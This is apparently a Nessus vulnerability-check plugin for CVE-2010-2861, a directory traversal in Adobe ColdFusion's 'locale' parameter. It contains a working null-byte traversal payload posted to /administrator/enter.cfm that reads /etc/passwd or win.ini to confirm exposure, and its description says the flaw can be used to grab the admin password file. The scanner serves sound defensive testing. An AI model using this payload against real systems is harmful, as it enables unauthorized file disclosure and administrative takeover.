#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(48340);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/11/17 21:38:53 $");

  script_cve_id("CVE-2010-2861");
  script_bugtraq_id(42342);
  script_osvdb_id(67047);
  script_xref(name:"EDB-ID", value:"14641");
  script_xref(name:"EDB-ID", value:"16985");

  script_name(english:"Adobe ColdFusion 'locale' Parameter Directory Traversal");
  script_summary(english:"Attempts a dir traversal attack.");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is
affected by a directory traversal vulnerability in the administrative
web interface. Input to the 'locale' parameter of multiple pages is
not properly sanitized.

A remote, unauthenticated attacker can exploit this by sending
specially crafted HTTP requests, allowing them to download arbitrary
files from the system.

An attacker could use this to download the ColdFusion password file
(which contains the admin password), thereby gaining access to the
administrative web interface. Authenticated administrative access can
result in arbitrary code execution.");
  # http://web.archive.org/web/20100815053453/http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?eab312a6");
  # http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?04963f76");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb10-18.html");
  # https://helpx.adobe.com/coldfusion/kb/coldfusion-security-hot-fix-bulletin.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bea698e8");
  script_set_attribute(attribute:"solution", value:"Apply the hotfix referenced in Adobe's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/08/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/08/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/08/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "coldfusion_detect.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

url = '/administrator/enter.cfm';

foreach file (files)
{
  postdata = 'locale=%00../../../../../../../../../../..' + file + '%00';
  postdata += SCRIPT_NAME + '-' + unixtime();

  res = http_send_recv3(
    method : 'POST',
    item   : dir + url,
    port   : port,
    content_type : 'application/x-www-form-urlencoded',
    data         : postdata,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    output = strstr(res[2], '<title>') - '<title>';
    if (!empty_or_null(output))
    {
      extra = strstr(res[2], '</title>');
      output -= extra;
    }
    else output = res[2];

    security_report_v4(
      port        : port,
      severity    : SECURITY_WARNING,
      file        : file,
      request     : make_list(http_last_sent_request()),
      output      : chomp(output),
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
